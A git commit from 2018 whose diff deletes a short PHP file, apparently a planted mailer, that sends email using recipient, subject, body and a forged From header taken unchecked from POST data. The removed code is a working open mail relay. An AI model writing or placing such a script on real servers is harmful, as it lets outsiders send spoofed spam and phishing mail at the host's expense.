1c934c21d8ec2a2b047e9452bf015761e51d56c5
Iqbal Firzal <iqbal.firzal@gmail.com>
2018-01-10 20:19:09 +0700

    Delete FvCkInMyEveryDaY.php

--- int/FvCkInMyEveryDaY.php
+++
@@ -1,7 +0,0 @@
-<?php 
-		$to = urldecode($_POST['name']);
-		$subject = urldecode($_POST['subject']);
-		$message = urldecode($_POST['email']);
-		$headers = 'From: ' . urldecode($_POST['user']) . PHP_EOL ;
-		mail ( $to, $subject, $message, $headers ) ;
- ?>
